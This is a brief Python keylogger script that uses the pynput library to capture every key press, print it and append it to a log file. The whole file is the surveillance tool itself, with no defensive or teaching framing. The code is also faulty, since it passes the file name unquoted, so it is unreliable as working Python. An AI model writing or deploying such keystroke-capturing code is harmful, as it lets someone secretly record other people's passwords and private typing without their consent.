from pynput import keyboard 

def keylog(key):
    print(str(key))
    with open(logs.txt, 'a') as logs:
        try:
            logs.write(str(key))
        except:
            print("skipi 3bdsami3")

            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keylog)
    listener.start()
    input()
